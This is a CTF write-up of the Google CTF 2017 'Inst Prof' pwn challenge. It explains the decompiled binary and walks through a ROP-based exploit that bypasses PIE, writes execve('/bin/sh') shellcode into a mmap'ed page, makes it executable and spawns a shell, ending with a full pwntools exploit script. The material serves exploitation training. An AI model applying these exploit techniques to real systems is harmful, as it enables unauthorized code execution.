---
layout:     post
title:      "Google CTF 2017 - Inst Prof [pwn]"
date:       2017-06-25 14:20:10
tags:       ctf, pwn
---

### Task info

* CTF: Google Quals CTF 2017
* Task: Inst Prof
* Category: pwn
* Solved by: 82 teams
* Points: 147 (depends on number of solves)
* Task description:
> Please help test our new compiler micro-service
>
> Challenge running at inst-prof.ctfcompetition.com:1337
>
> * [inst\_prof](/assets/writeups/inst_prof_pwn/inst_prof) (binary attached)

### TL;DR

This post is quite long, so here is a _'Too long, didn't read'_ summary:

* ROP technique has been used along with jumping to main to "restart" the binary (with a bit changed state).
* Binary has PIE so I just copied addresses from stack memory and change them to another addresses.
* Second `mmap` call of the same permission and size allocated a page which was below the first one; this was true for both local machine and the server. The ASLR didn't change anything.
* The final hacking script can be found in the end of the post.

### Basic information

After launching the binary prints some text, sleeps for a few seconds, prints some more and then waits for user's input. Providing a random answer like `abcd` makes the program receive a `SIGILL` (illegal instruction) signal which is not handled and whose default action is to _terminate the process and dump core_ (this can be seen in `man 7 signal`).

```bash
$ ./inst_prof
initializing prof...ready
abcd
Illegal instruction (core dumped)
```

This - along with the task name - suggests that the input we provide is somehow related to the instructions being executed by the processor.

Lets also look over protections:
```bash
$ checksec --file ./inst_prof
[*] '/home/dc/gctf/inst_prof_pwn1/inst_prof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

As we can see there is NX ([Non eXecutable bit]((https://en.wikipedia.org/wiki/NX_bit))) enabled, partial RELRO ([RElocation Read-Only](http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html)) and PIE ([Position Independent Executable](https://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables)). Yet no [stack canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries) (a stack buffer overflow protection mechanism).

This information might be helpful later on - e.g. we can't hardcode code addresses in our payload as there is PIE.

### Static analysis

Lets start by looking what kind of file do we have. This can be done using `file` program:

```bash
$ file inst_prof
inst_prof: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24,
BuildID[sha1]=61e50b540c3c8e7bcef3cb73f3ad2a10c2589089, not stripped
```

The binary is an x86-64 ELF. Now by using a disassembler and a decompiler - e.g. Hex-Rays Decompiler for IDA Pro, we can check what the program was actually designed for. Below you can see the decompiled code along with some additional comments.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp) {
  if ( write(1, "initializing prof...", 0x14uLL) == 20 ) {
    sleep(5u);   // annoying sleep
    alarm(30u);  // generates SIGALRM signal after 30s, used probably as a timeout

    if ( write(1, "ready\n", 6uLL) == 6 )
      while ( 1 )
        do_test();
  }
  exit(0);
}

int do_test() {
  void *v0;             // rbx@1
  char v1;              // al@1
  unsigned __int64 v2;  // r12@1
  unsigned __int64 buf; // [sp+8h] [bp-18h]@1

  v0 = alloc_page();            // mmaps (allocates) 4 kB RW page

  // writes opcodes from a template to allocated memory (see below for more info)
  *(_QWORD *)v0 = *(_QWORD *)"¦";
  *((_DWORD *)v0 + 2) = *(_DWORD *)&template[8];
  v1 = template[14];
  *((_WORD *)v0 + 6) = *(_WORD *)&template[12];
  *((_BYTE *)v0 + 14) = v1;

  read_inst((char *)v0 + 5);    // reads 4 bytes into v0+5
  make_page_executable(v0);     // mprotects allocated page to RX

  // executes and measures execution time of code from allocated region
  v2 = __rdtsc();
  ((void (__fastcall *)(void *))v0)(v0);
  buf = __rdtsc() - v2;

  if ( write(1, &buf, 8uLL) != 8 )  // writes timer to stdout
    exit(0);                        // exits if it didn't write all 8 bytes

  return free_page(v0);             // munmaps (deallocates) allocated memory page
}

void __fastcall read_inst(char *buf) {
  read_n(buf, 4LL);
}

void __fastcall read_n(char *buf, __int64 n) {
  char *ptr = buf; // rbx@1

  if ( n )
    do
      *(++ptr - 1) = read_byte();
    while ( ptr != &buf[n] );
}

__int64 read_byte() {
  unsigned __int8 buf; // [sp+Fh] [bp-1h]@1

  buf = 0;
  if ( read(0, &buf, 1uLL) != 1 )
    exit(0);
  return buf;
}

void *alloc_page() {
  // Flags:      3 = PROT_READ | PROT_WRITE
  //            34 = MAP_PRIVATE | MAP_ANONYMOUS
  return mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
}

int __fastcall make_page_executable(void *ptr) {
  return mprotect(ptr, 0x1000uLL, 5);       // 5 = PROT_READ | PROT_EXEC
}

int __fastcall free_page(void *ptr) {
  return munmap(ptr, 0x1000uLL);
}
```

As we can see, main function executes `do_test` in an infinite loop and this function does a few things:
* allocates a 4096 bytes readable and writable page (value 3 - `PROT_READ | PROT_WRITE`)
* writes a code template to this page - the `template` code loops 4096 times having 4 `nop` instructions which we can overwrite:
```
.rodata:00000C00                 public template
.rodata:00000C00 template:
.rodata:00000C00                 mov     ecx, 1000h      ; ecx - loop counter
.rodata:00000C05
.rodata:00000C05 loop_iter:
.rodata:00000C05                 nop
.rodata:00000C06                 nop
.rodata:00000C07                 nop
.rodata:00000C08                 nop
.rodata:00000C09                 sub     ecx, 1           ; decrement loop counter
.rodata:00000C0C                 jnz     short loop_iter  ; if loop counter is not 0,
.rodata:00000C0E                 retn
```
* reads 4 bytes and saves it in the `mmap`'ed region +5 overwriting `nop` instructions
* makes the previously allocated 4096B memory region readable and executable (value 5 - `PROT_READ | PROT_EXEC`) using `mprotect`
* executes the code lying under `mmap`'ed memory and counts its time execution using processor's time-stamp counter ([`rtdsc` instruction](http://x86.renejeschke.de/html/file_module_x86_id_278.html))
* writes the counter/timer to stdout
* deallocates the memory region

The most important thing here is that we can provide 4 bytes that will be put into the code template and then will be executed 4096 times because of the loop in the template. We can actually make our payload be executed just once by providing `ret` instruction opcode - which is 1 byte - inside of it. Of course this limits us to sending only instructions with at most 3 bytes in length.

#### Memory leak idea

Another interesting thing is that the execution time of our payload is printed to us. This can be used in order to create a memory leak. Such a leak could be performed with steps listed below:
* put particular address in a register - e.g. `r14`
* get the value/dereference the address - `mov r15, DWORD PTR [r14]`
* make a bitwise AND operation - getting particular bit of the value - `and r15, 1`
* measure and compare time of `sub rcx, r15` after above instructions and when `r15` is just 0

If the time of `sub rcx, r15` with all the previous steps is similar to time when `r15` register is just 0, it means that the given bit is 0. Otherwise its value is 1.
The meaning of "similar time" would have to be measured/checked experimentally.

Of course the above idea leaks just the first bit. For other bits we would have to shift  value stored in `r15` register to the right by using `shr r15, X` instruction before `and r15, 1`. The `X` is the bit index we would like to leak.

### Basic script

Below you can see a script base used to solve the task. It uses awesome [pwntools](https://github.com/Gallopsled/pwntools) module and can be invoked as:
* `./hack.py` - launches process locally
* `./hack.py GDB` - launches process under GDB setting a breakpoint before calling the template code (`&do_test+86`)
* `./hack.py GDB="break main"` - launches process under GDB with given gdbscript (here setting a breakpoint on the `main` function)
* `./hack.py REMOTE` - connects to the organizers server

It also defines `send_instr` function that assembles given instructions, validates whether they are 4 bytes long - if not it pads them with `ret` which skips unnecessary loop iterations.

```python
#!/usr/bin/env python
# coding: utf8
from pwn import *

binary = './inst_prof'
host, port = 'inst-prof.ctfcompetition.com:1337'.split(':')
port = int(port)

e = ELF(binary)         # setting pwntools context os/arch
context.os = 'linux'    # so that we won't have to specify it explicitly
context.arch = e.arch   # when using pwntools functions like asm etc.

# Command line arguments handling
if args['REMOTE']:
    p = remote(host, port)
elif args['GDB']:
    gdbscript = args['GDB'] if args['GDB'] != 'True' else 'break *&do_test+86'
    p = gdb.debug(binary, gdbscript=gdbscript)
else:
    p = process(binary)

def send_instr(instrs):
    payload = asm(instrs)

    assert len(paylod) <= 4, "Payload too long: %s" % instr

    while len(payload) < 4:     # filling remaining bytes with
        payload += asm('ret')   # `ret` instructions (`ret` has 1 byte)

    p.send(payload)

    # Can be used to retrieve rtdsc result and so leak memory,
    # I didn't use it in the end
    #rtdsc = u64(p.recv(8))
    #print('Timer value: 0x%x\tfor\t%s' % (rtdsc, instrs))

info('Receiving HELLO: %s' % p.recvuntil('initializing prof...ready\n'))
send_instr('nop')       # just for testing purpose
p.interactive()         # going to interactive mode
```

Lets look if the script works properly:

```
./hack.py
[*] '/home/dc/gctf/inst_prof_pwn1/inst_prof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './inst_prof': pid 14205
[*] Receiving HELLO: initializing prof...ready
Timer value: 0xca    for    nop
[*] Switching to interactive mode
$ abcd
[*] Got EOF while reading in interactive
$
[*] Process './inst_prof' stopped with exit code -4 (SIGILL) (pid 14205)
[*] Got EOF while sending in interactive
```

### Patching the binary

After starting the binary sleeps for 5 seconds. As it might be required to launch binary locally a lot of times to try out different solutions, the `sleep` call can be patched.

In order to do it we need an address of `call _sleep` instruction. It can be obtained e.g. in IDA Pro using a graph view (enabling `Line prefixes (graph) in Options->General` beforehand):
![IDA Pro 'call _sleep' screen](/assets/writeups/inst_prof_pwn/ida_sleep.png){: .center-image }

As we can see, the `call _sleep` is on 0x88C (very short address due to PIE) and has the size of 5 bytes (we can get it by subtracting next instruction address from the current one - 0x891-0x88C = 5). Now we can put there 5 `nop` (aka _no operation_) instructions as each `nop` is exactly 1 byte - we can see this by using pwntools CLI `pwn` program:

```bash
$ pwn asm --context 64 "nop"
90
```

Which by default returns opcodes for given instructions in hex format. Here we can see that `nop` is `0x90`.

The patching itself can be done using pwntools module in IPython (an interactive Python shell):

```python
In [1]: import pwn
In [2]: e = pwn.ELF('./inst_prof')
In [3]: e.write(0x88C, pwn.asm('nop;' * 5, os='linux', arch='amd64'))
In [4]: e.save()
```

After this we can confirm that the patch was made properly:

![IDA Pro patched 'call _sleep'](/assets/writeups/inst_prof_pwn/ida_sleep_patched.png){: .center-image }

From now on we also don't waste 5 seconds for each execution of the binary.

### Instructions we can use

As we can provide opcodes up to 4 bytes each time the `do_test` is called in `main`, lets look over what we can put in a single payload.

Below you can see a table of instructions and the opcodes they are translated to. Note that some of them require padding with `ret` or `nop` in the payload as we have to provide 4 bytes.

<style type="text/css">
  table {
    margin-left: auto;
    margin-right: auto;
    border-collapse: collapse;
  }
  td {
      padding: 2px 15px 2px 15px;
  }
</style>
| Opcodes       | Bytes | Instructions   |                  Comment                 |
|---------------|:-----:|----------------|:----------------------------------------:|
| 48&nbsp;31&nbsp;c0    | 3 | xor&nbsp;rax,&nbsp;rax     | - |
| 31&nbsp;c0    | 2 | xor&nbsp;eax,&nbsp;eax     | zeroes rax register |
| 48&nbsp;c7&nbsp;c3&nbsp;01&nbsp;00&nbsp;00&nbsp;00    | 7 | mov&nbsp;rbx,&nbsp;1     | too big to use |
| bb&nbsp;01&nbsp;00&nbsp;00&nbsp;00    | 5 | mov&nbsp;ebx,&nbsp;1     | too big to use |
| 66&nbsp;bb&nbsp;01&nbsp;00    | 4 | mov&nbsp;bx,&nbsp;1     | - |
| ff&nbsp;ca    | 2 | dec&nbsp;edx     | - |
| ff&nbsp;c2    | 2 | inc&nbsp;edx     | - |
| 49&nbsp;ff&nbsp;c7    | 3 | inc&nbsp;r15     | - |
| 4d&nbsp;89&nbsp;f5    | 3 | mov&nbsp;r13,&nbsp;r14     | - |
| 4d&nbsp;8b&nbsp;3e    | 3 | mov&nbsp;r15,&nbsp;[r14]     | - |
| 4d&nbsp;8b&nbsp;7e&nbsp;20    | 4 | mov&nbsp;r15,&nbsp;[r14+32]     | - |
| 4d&nbsp;89&nbsp;37    | 3 | mov&nbsp;[r15],&nbsp;r14     | - |
| 4d&nbsp;89&nbsp;77&nbsp;40    | 4 | mov&nbsp;[r15+64],&nbsp;r14     | max offset for 4B instruction is 127 |
| 4d&nbsp;89&nbsp;b7&nbsp;80&nbsp;00&nbsp;00&nbsp;00    | 7 | mov&nbsp;[r15+128],&nbsp;r14     | too big to use |
| 4d&nbsp;8d&nbsp;7d&nbsp;7f    | 4 | lea&nbsp;r15,&nbsp;[r13+127]     | max offset for 4B instruction is 127 |
|               |       |                |                                          |


### Program state when payload is being executed

First of all, lets see what is the program state when we are stepping through the _payload code_. To do it we can just launch the basic script provided earlier as `./hack.py GDB`, doing `continue` and `si` to step into the mmap'ed memory. Below you can see a screenshot of GDB that uses [Pwndbg](https://github.com/pwndbg/pwndbg) plugin after performing those steps.

![GDB with Pwndbg stopped on our breakpoint](/assets/writeups/inst_prof_pwn/pwndbg_start.png){: .center-image }

Firstly, lets check if there are any registers that are persistent between consecutive payloads.
This can be checked easily by putting the below code instead of `send_instr('nop')` in our script:
```python
# we don't check for rcx as ecx is used as a loop counter
regs = ('rax', 'rbx', 'rdx', 'rsi', 'rdi',
        'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15')

for reg in regs:
    info('Modyfing %s register' % reg)  # inform us what will be send
    send_instr('lea %s, [r9+32]' % reg) # change particular register's value
```

and launching it again under GDB and stopping before `0x5558b296cb16 <do_test+86>     call   rbx` instruction is executed.
we can see that the only registers that are persistent are R13, R14 and R15 by continuing the execution and checking the registers values.

Having those registers' values persistent, we can easily get and set values on the stack. For example in order to get the value from RBP-8 address, we can use:
```
lea r15, [rbp-8]
mov r14, [r15]
```

and to set value on RBP+8:
```
mov [rbp+8], r14
```

With that being said, we can prepare a ROP ([return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming)) attack. Since this is a PIE binary and we don't know the base address of code, we will have to find either this address or any other code address the other way. As we will see later, there are plenty of code addresses on the stack that we will be able to copy and change to different addresses.

### Exploiting the binary

The binary itself has only 148 gadgets (small code pieces that end e.g. with `ret` which can be used in a ROP attack), so it is not possible to do anything with them - for example there is no `syscall` gadget, so we can't really do a lot.

Despite that, there is plenty of useful code in the program's normal flow - allocating memory page, reading bytes to given address or changing its permissions. This could be used to either allocate new memory page or change permissions of the already allocated one to RWX (read, write, execute) and then put a [shellcode](https://en.wikipedia.org/wiki/Shellcode) in that memory and run it.

Finally, I have decided to make a ROP which would allocate 4k RW memory page using `alloc_page`, after that somehow read a shellcode into it, `mprotect` it using `make_page_executable` and then execute it.

I have also tried to change memory permissions by jumping in the middle of `make_page_executable`. However, there weren't any gadgets one could use to set `mprotect`'s permissions/flags argument (which is passed through RDX registry).

The first step is to find out where the `do_test`'s function's return address is stored, as we want to change it. In order to achieve that we can use `retaddr` - Pwndbg command and its stack display. As we can see on the screenshot below, the RSP points to stack memory where `do_test`'s return address is stored:

![Displaying return address in Pwndbg](/assets/writeups/inst_prof_pwn/pwndbg_retaddr.png){: .center-image }

Now, as we would like to allocate new memory page, we need to get the `alloc_page` function's address. As we can see on the screenshot below, `alloc_page` is located on 0x9f0 address:

![alloc_page function](/assets/writeups/inst_prof_pwn/ida_alloc_page.png){: .center-image }

But this is just an offset from .text section base address. In order to get the rebased address we need to get a code address from the stack and move/change it to `alloc_page`'s address.

Lets look over stack values by invoking `stack` pwndbg command with some adjustments:

![stack values](/assets/writeups/inst_prof_pwn/pwndbg_stack.png){: .center-image }

We can see that R13 is pointing somewhere on the stack, further than RSP or RBP. We can use that memory to store ROP in, as R13 is not used anywhere between `do_test` calls.

We can also see that there is a pointer to `0x55c78c5e6aa3` or 0xaa3 (an address without rebasing) on the stack, which is very close to `alloc_page` function's address - 0x9f0:
```
03:0018│      0x7fff3c67a988 —▸ 0x55c78c5e6aa3 (read_n+35) ◂— mov    byte ptr [rbx - 1], al
```

This pointer is stored in 0x7fff3c67a988 which is the same as RBP-72 (as `0x7fff3c67a9d0-0x7fff3c67a988=72`). We can use that offset (RBP-72) to copy the pointer and change that copy so that it would point to `alloc_page`. To do that we can modify our script to:

```python
instructions = [
    'lea r14, [rbp-72]',    # load address of pointer to 0xaa3 to r14
    'mov r15, [r14]',       # copy value under the pointer (0xaa3) to r15
    'mov r14, r15',         # copy the value to r14, both r14 and r15 hold 0xaa3
    'lea r15, [r14-116]',   # r15 = r14-116, r15 is now 0xaa3 - 116 = 0xa2f
    'mov r14, r15',         # r14 = r15,     r14 is now 0xa2f
    'lea r15, [r14-63]',    # r15 = r14-63,  r15 is now 0xa2f -  63 = 0x9f0, r15 now points to alloc_page
    'mov [r13], r15',       # put alloc_page addr on the stack

    # Below line is here just for testing purposes
    # It changes RSP so that we start ROP chain leaving do_test function
    'mov rsp, r13'
]

for instr in  instructions:
    send_instr(instr)

p.interactive()
```

After that a problem occured. The `mmap` result from `alloc_page` is returned in RAX and I couldn't find gadgets to move it to another register. I have decided to check if there is any relation between two `mmap`'ed addresses and it turned out that the second page is exactly 4096 bytes below the first one.
This relation was persistent between different local executions both with and without ASLR ([Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)). I was not sure whether it would be true on the organizer's server but it turned out it was.

Since I already had a pointer to the first `mmap`'ed address on the stack:
```
04:0020| 0x7fff3c67a990 —▸ 0x7fb649f0a000 ◂— mov    ecx, 0x1000
```

I modified the script to calculate the address of the second memory page, put it on the stack and jump back to `main`:
```python
instructions = [
    'lea r14, [rbp-72]',    # load address of pointer to 0xaa3 to r14
    'mov r15, [r14]',       # copy value under the pointer (0xaa3) to r15
    'mov r14, r15',         # copy the value to r14, both r14 and r15 hold 0xaa3
    'lea r15, [r14-116]',   # r15 = r14-116, r15 is now 0xaa3 - 116 = 0xa2f
    'mov r14, r15',         # r14 = r15,     r14 is now 0xa2f
    'lea r15, [r14-63]',    # r15 = r14-63,  r15 is now 0xa2f -  63 = 0x9f0, r15 now points to alloc_page
    'mov [r13], r15',       # put alloc_page addr on the stack

    # Below line is here just for testing purposes
    # It changes RSP so that we start ROP chain leaving do_test function
    #'mov rsp, r13'

    # Grabs mmap'ed memory page address to r15
    'lea r14, [rbp-64]',    # load address of pointer to mmap'ed page to r14
    'mov r15, [r14]',       # copy value under the pointer to r15
]

# subtract r15 address by 128*32 = 4096 (0x1000)
# so r15 will point to the later/new mmap'ed page, where we will put shellcode
instructions += [
    'mov r14, r15',
    'lea r15, [r14-128]',
] * 32

# copies main address to [r13+8]
instructions += [
    'mov r14, [rbp+56]',    # gets main address to r14
    'mov [r13+8], r14',     # puts main address under memory pointed by r13+8
]
# After above we will have r13 storing a stack addr where we will have:
# +0: `alloc_page` function address
# +8: `main` function address
#
# Below instruction will start our ROP chain
instructions += ['mov rsp, r13']

for instr in instructions:  # execute first part of our ROP
    send_instr(instr)
```

After this part I have also checked whether it works on remote - as `main` execution prints out `"initializing prof...ready"` - and it worked :).

As R15 is never used by the program when the next `main` execution goes again to `do_test` the R15 points to 4k RW `mmap`'ed memory into which we can write our shellcode.
Grabbing a shellcode is fairly easy and can be done using pwntools. Lets see it in IPython:
```python
In [1]: print pwn.shellcraft.amd64.sh()
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall

In [2]: pwn.asm(pwn.shellcraft.amd64.sh(), os='linux', arch='amd64')
Out[2]: 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

That being said, we can just put shellcode to the `mmap`'ed region byte by byte:
```python
info('Receiving second HELLO: %s' % p.recvuntil('initializing prof...ready\n'))

payload = shellcraft.amd64.sh()
shellcode_bytes = map(ord, asm(payload, os='linux', arch='amd64'))

send_instr('mov r14, r15')  # make a copy of begining of mmap'ed memory region address for later use
for byte in shellcode_bytes:
    send_instr('mov BYTE PTR [r15], %d' % byte)     # put shellcode byte
    send_instr('inc r15')                           # advance to next memory cell
```

Then we have to make our page executable. To do so, we can use `make_page_executable` function which uses `mprotect` syscall:

![make_page_executable function](/assets/writeups/inst_prof_pwn/ida_make_page_executable.png){: .center-image }

The `mprotect` function's declaration in C language is `int mprotect(void *addr, size_t len, int prot);`. We can pass `addr` pointer in RDI register as RDI is used for passing the first argument to syscalls on x86-64 binaries (see [x86-64 syscall table](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)). In order to do that we can look for `pop rdi` gadget using e.g. [ropper](https://github.com/sashs/Ropper):

```
$ ropper --file inst_prof --console
[INFO] Load gadgets from cache
[LOAD] removing double gadgets... 100%
(inst_prof/ELF/x86_64)> search pop rdi%
[INFO] Searching for gadgets: pop rdi%

[INFO] File: inst_prof
0x0000000000000bc3: pop rdi; ret;
```

We have such a gadget located on 0xbc3 offset, so we can use it in our ROP chain.

Below you can see the rest of the script - as you can read in the comments it creates a ROP chain that sets up argument for `make_page_executable`, calls it and jumps into the shellcode which spawns a shell. It doesn't use anything that hasn't been explained before.

```python
##### Below we put our ROP chain on the stack (r13 points to some stack region):
# [r13 +8] - address of `pop rdi; pop` gadget
# [r13+16] - mmap'ed memory address, pop rdi will eat it
# [r13+24] - make_page_executable - changes memory region to readable and executable
# [r13+32] - address of readable and executable memory that contains our shellcode

##### saving shellcode/mmap'ed memory region address to the stack
send_instr('mov [r13+16], r14') # saving shellcode address so `pop rdi` gets it
send_instr('mov [r13+32], r14') # saving shellcode so rop jumps to it

##### gets `pop rdi; pop` gadget address
# rsp  0x7ffd907db1d0 —▸ 0x55cb935cfb18 (do_test+88) ◂— rdtsc
send_instr('mov r14, [rsp]') # r14 will have do_test+88 address = 0xb18
# 0xbc3-0xb18 = 171 - we need to advance r14 by 171
send_instr('lea r15, [r14+127]')    # r15 = 0xb18 + 127 = 0xb97
send_instr('mov r14, r15')          # r14 = r15 = 0xb97
send_instr('lea r15, [r14+44]')     # r15 = 0xb97 + 44 = 0xbc3 (`pop rdi; pop` gadget addr)
send_instr('mov [r13+8], r15')      # save gadget address to the stack

###### gets `make_page_executable` address (0xa20) to r13+24
# 06:0030│      0x7fff73937360 —▸ 0x55573d395aa3 (read_n+35) ◂— mov    byte ptr [rbx - 1], al
# 0f:0078│ rbp  0x7fff739373a8
send_instr('mov r14, [rbp-72]')     # r14 = addr —▸ aa3
send_instr('lea r15, [r14-127]')    # r15 = 0xaa3 - 127 = 0xa24
send_instr('mov r14, r15')          # r14 = r15 = 0xa24
send_instr('lea r15, [r14-4]')      # r15 = 0xa24 - 4 = 0xa20
send_instr('mov [r13+24], r15')     # save `make_page_executable` addr to the stack

###### "MAKE ROPCHAIN GREAT AGAIN!" - executes our rop chain
send_instr('lea rsp, [r13+8]')

p.interactive()
```

We can see full script in action below:

<script type="text/javascript" src="https://asciinema.org/a/Z9ByJ25GMQJiHr57FXVOk6QSD.js" id="asciicast-Z9ByJ25GMQJiHr57FXVOk6QSD" async></script>

When launched on the server we could get the flag:
```
$ ls
flag.txt
inst_prof
$ cat flag.txt
CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}
```

Below you can find the final code of the script:
```python
#!/usr/bin/env python
# coding: utf8
from pwn import *

# FILL binary and host, port
binary = './inst_prof'
host, port = 'inst-prof.ctfcompetition.com:1337'.split(':')
port = int(port)

e = ELF(binary)
context.os = 'linux'
context.arch = e.arch

### LAUNCH THE BINARY/CONNECT ETC
if args['REMOTE']:
    p = remote(host, port)
elif args['GDB']:
    if args['GDB'] == 'SHORT':
        gdbscript = 'break *&do_test+86'
    else:
        gdbscript = 'b main\nc\nc\nbreak *&do_test+86'
        print('Setting gdbscript so we will break at 2nd main execution, this may take long time')
    print('gdbscript = %s' % repr(gdbscript))
    p = gdb.debug(binary, gdbscript=gdbscript)
else:
    p = process(binary)

p.recvuntil('initializing prof...ready\n')
info('Received HELLO from 1st main execution.')

def send_instr(instrs):
    payload = asm(instrs, arch='amd64')

    if len(payload) < 4:
        payload += asm('ret', arch='amd64')

    assert len(payload) <= 4, "Payload too long: %s" % instrs

    p.send(payload)

instructions = [
    'lea r14, [rbp-72]',    # load address of pointer to 0xaa3 to r14
    'mov r15, [r14]',       # copy value under the pointer (0xaa3) to r15
    'mov r14, r15',         # copy the value to r14, both r14 and r15 hold 0xaa3
    'lea r15, [r14-116]',   # r15 = r14-116, r15 is now 0xaa3 - 116 = 0xa2f
    'mov r14, r15',         # r14 = r15,     r14 is now 0xa2f
    'lea r15, [r14-63]',    # r15 = r14-63,  r15 is now 0xa2f -  63 = 0x9f0, r15 now points to alloc_page
    'mov [r13], r15',       # put alloc_page addr on the stack

    # Below line is here just for testing purposes
    # It changes RSP so that we start ROP chain leaving do_test function
    #'mov rsp, r13'

    # Grabs mmap'ed memory page address to r15
    'lea r14, [rbp-64]',    # load address of pointer to mmap'ed page to r14
    'mov r15, [r14]',       # copy value under the pointer to r15
]

# subtract r15 address by 128*32 = 4096 (0x1000)
# so r15 will point to the later/new mmap'ed page, where we will put shellcode
instructions += [
    'mov r14, r15',
    'lea r15, [r14-128]',
] * 32

# copies main address to [r13+8]
instructions += [
    'mov r14, [rbp+56]',    # gets main address to r14
    'mov [r13+8], r14',     # puts main address under memory pointed by r13+8
]
# After above we will have r13 storing a stack addr where we will have:
# +0: `alloc_page` function address
# +8: `main` function address
#
# Below instruction will start our ROP chain
instructions += ['mov rsp, r13']

for instr in instructions:  # execute first part of our ROP
    send_instr(instr)

p.recvuntil('initializing prof...ready\n')
info('Received HELLO from 2nd main execution.')

payload = shellcraft.amd64.sh()
shellcode_bytes = map(ord, asm(payload, os='linux', arch='amd64'))

send_instr('mov r14, r15')  # make a copy of begining of mmap'ed memory region address for later use
for byte in shellcode_bytes:
    send_instr('mov BYTE PTR [r15], %d' % byte)     # put shellcode byte
    send_instr('inc r15')                           # advance to next memory cell

##### Below we put our ROP chain on the stack (r13 points to some stack region):
# [r13 +8] - address of `pop rdi; pop` gadget
# [r13+16] - mmap'ed memory address, pop rdi will eat it
# [r13+24] - make_page_executable - changes memory region to readable and executable
# [r13+32] - address of readable and executable memory that contains our shellcode

##### saving shellcode/mmap'ed memory region address to the stack
send_instr('mov [r13+16], r14') # saving shellcode address so `pop rdi` gets it
send_instr('mov [r13+32], r14') # saving shellcode so rop jumps to it

##### gets `pop rdi; pop` gadget address
# rsp  0x7ffd907db1d0 —▸ 0x55cb935cfb18 (do_test+88) ◂— rdtsc
send_instr('mov r14, [rsp]') # r14 will have do_test+88 address = 0xb18
# 0xbc3-0xb18 = 171 - we need to advance r14 by 171
send_instr('lea r15, [r14+127]')    # r15 = 0xb18 + 127 = 0xb97
send_instr('mov r14, r15')          # r14 = r15 = 0xb97
send_instr('lea r15, [r14+44]')     # r15 = 0xb97 + 44 = 0xbc3 (`pop rdi; pop` gadget addr)
send_instr('mov [r13+8], r15')      # save gadget address to the stack

###### gets `make_page_executable` address (0xa20) to r13+24
# 06:0030│      0x7fff73937360 —▸ 0x55573d395aa3 (read_n+35) ◂— mov    byte ptr [rbx - 1], al
# 0f:0078│ rbp  0x7fff739373a8
send_instr('mov r14, [rbp-72]')     # r14 = addr —▸ aa3
send_instr('lea r15, [r14-127]')    # r15 = 0xaa3 - 127 = 0xa24
send_instr('mov r14, r15')          # r14 = r15 = 0xa24
send_instr('lea r15, [r14-4]')      # r15 = 0xa24 - 4 = 0xa20
send_instr('mov [r13+24], r15')     # save `make_page_executable` addr to the stack

###### "MAKE ROPCHAIN GREAT AGAIN!" - executes our rop chain
send_instr('lea rsp, [r13+8]')

p.interactive()
```
